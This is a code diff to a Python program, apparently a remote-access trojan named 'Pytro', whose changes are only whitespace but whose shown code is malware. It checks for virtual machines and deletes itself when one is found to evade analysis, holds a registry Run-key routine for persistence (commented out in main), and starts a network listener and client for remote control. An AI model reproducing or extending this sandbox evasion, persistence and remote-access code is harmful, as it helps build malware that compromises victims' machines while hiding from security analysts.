@@ -9,6 +9,7 @@ import winreg
 from media_utils import start_listener
 from network_utils import start_client
 
+
 def check_vm():
     uname = platform.uname()
     common_vm_signals = ["vm", "virtual", "hyperv", "xen", "kvm", "vbox", "qemu"]
@@ -38,6 +39,7 @@ def check_vm():
 
     return False
 
+
 def add_to_startup(file_path=None):
     if file_path is None:
         file_path = os.path.abspath(sys.argv[0])
@@ -56,6 +58,7 @@ def add_to_startup(file_path=None):
     winreg.SetValueEx(key, 'Pytro', 0, winreg.REG_SZ, destination_file)
     winreg.CloseKey(key)
 
+
 def self_destruction():
     try:
         os.remove(sys.argv[0])
@@ -63,13 +66,14 @@ def self_destruction():
     except Exception as e:
         print(f"Failed to delete the script: {e}")
 
+
 def main():
     if check_vm():
         print("Running inside a Virtual Machine. Self-destruction initiated...")
         self_destruction()
     else:
         print("Running on a physical machine.")
-    #   add_to_startup()
+        # add_to_startup()
         threading.Thread(target=start_listener).start()
         start_client()
 
